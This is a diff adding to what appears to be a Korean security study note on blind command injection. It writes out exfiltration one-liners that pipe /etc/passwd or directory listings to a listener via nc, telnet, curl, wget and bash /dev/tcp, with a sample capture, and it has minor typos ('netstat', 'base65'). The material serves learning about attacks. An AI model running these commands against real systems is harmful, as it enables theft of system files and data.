@@ -213,6 +213,59 @@
 <br/><br/>
 
 ### 실행 결과를 확인할 수 없는 상황
+* Command Injection 취약점이 발생해 원하는 OS 명령어를 실행할 수 있지만, 실행 결과가 사용자에게 노출되지 않는 상황에서 활용할 수 있는 공격 방법들 <br/> &nbsp;&nbsp; → Network In/Out Bound 제한 여부와 출력 리다이렉션 가능 여부를 기준으로 다음과 같이 분류할 수 있음
+
+<br/>
+
+* Network In/Out Bound의 제한이 없을 때 사용할 수 있는 방법
+    - **Network Outbound**: 삽입할 명령줄에 **네트워크 도구**를 함께 실행해 자신의 서버에 명령어 실행 결과를 전송함
+        + 네트워크 도구를 서버에 설치할 수 있거나 설치되었을 때 사용 가능한 방법들이 이에 해당됨
+        + OS 명령어를 실행한 결과를 네트워크 도구를 이용해 외부 서버로 전송하는 방법
+            - nc (netstat)
+                + TCP 또는 UDP 프로토콜을 사용하는 네트워크에서 데이터를 송수신하는 프로그램 <br/> &nbsp;&nbsp; → 쉘에서 제공하는 **파이프와 함께 사용**하여 앞서 실행한 명령어의 결과를 네트워크로 전송할 수 있음
+                + 예시
+                    - [1] 파이프와 nc를 통해 /etc/passwd 파일의 출력 결과를 특정 IP(```127.0.0.1```), PORT(```8080```)에 전송함
+                        ```linux
+                        cat /etc/passwd | nc 127.0.0.1 8080
+                        ```
+                    - [2] nc를 이용해 해당 IP(```127.0.0.1```), PORT(```8080```)로 전송된 데이터의 내용을 확인할 수 있음
+                        ```linux
+                        $ nc -l -p 8080 -k -v
+                        Listening on [0.0.0.0] (family 0, port 8080)
+                        Connection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 42396)
+                        root:x:0:0:root:/root:/bin/bash
+                        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+                        bin:x:2:2:bin:/bin:/usr/sbin/nologin
+                        sys:x:3:3:sys:/dev:/usr/sbin/nologin
+                        ...
+                        ```
+            - telent
+                + 네트워크 연결에 사용되는 프로토콜 (클라이언트를 설치해 네트워크 연결을 시도할 수 있음) <br/> &nbsp;&nbsp; → 쉘에서 제공하는 **파이프와 함께 사용**하여 앞서 실행한 명령어의 결과를 네트워크로 전송할 수 있음
+                + 예시: /etc/passwd 파일의 출력 결과를 telnet을 이용해 ```127.0.0.1```(IP)의 ```8080```(PORT)번 포트로 전송함
+                    ```linux
+                    cat /etc/passwd | telnet 127.0.0.1 8080
+                    ```
+            - curl/wget
+                + 웹 서버의 컨텐츠를 가져오는 프로그램 <br/> &nbsp;&nbsp; → 웹 서버의 컨텐츠를 가져오기 위해 서버를 방문할 때 접속 로그가 남게 되는 특징을 이용해 **명령어의 실행 결과를 웹 서버의 경로 또는 Body와 같은 영역에 포함**해 전송함
+                + 예시
+                    - GET Parameter에 ```ls -al``` 실행 결과(디렉터리 목록)를 포함해서 네트워크(127.0.0.1의 8080번 포트)로 전송함
+                        ```linux
+                        curl "http://127.0.0.1:8080/?$(ls -al|base64 -w0)"
+                        ```
+                        + ```base65 -w0``` → 실행 결과의 개행을 제거하기 위해 base64로 인코딩하여 전달함
+                    - ```ls -al``` 실행 결과(디렉터리 목록)을 POST Body에 포함해서 네트워크(127.0.0.1의 8080번 포트)로 전송함
+                        ```linux
+                        curl http://127.0.0.1:8080/ -d "$(ls -al)"
+                        wget http://127.0.0.1:8080/ --method=POST --body-data="`ls -al`"
+                        ```
+            - /dev/tcp, /dev/udp
+                + (bash 한정) Bash에서 지원하는 기능으로 네트워크에 연결하는 방법
+                    - ```/dev/tcp``` 또는 ```/dev/udp``` 장치 경로의 하위 디렉터리로 IP 주소와 포트 번호(```/dev/tcp/{IP주소}/{PORT번호}```)를 입력하면 Bash는 해당 경로로 네트워크 연결을 시도하는 특징을 이용함 <br/> &nbsp;&nbsp; → 앞선 명령어의 실행 결과를 ```>``` 문자로 재지정(redirection)하여 해당 경로로 명령어의 실행 결과를 전송함
+                + 예제: ```/dev/tcp```를 이용하여 /etc/passwd 파일의 출력 결과를 네트워크(127.0.0.1의 8080번 포트)로 전송함
+                    ```linux
+                    cat /etc/passwd > /dev/tcp/127.0.0.1/8080
+                    ```
+    - **Reverse Shell / Bind Shell**
 
 <br/><br/><br/>
 
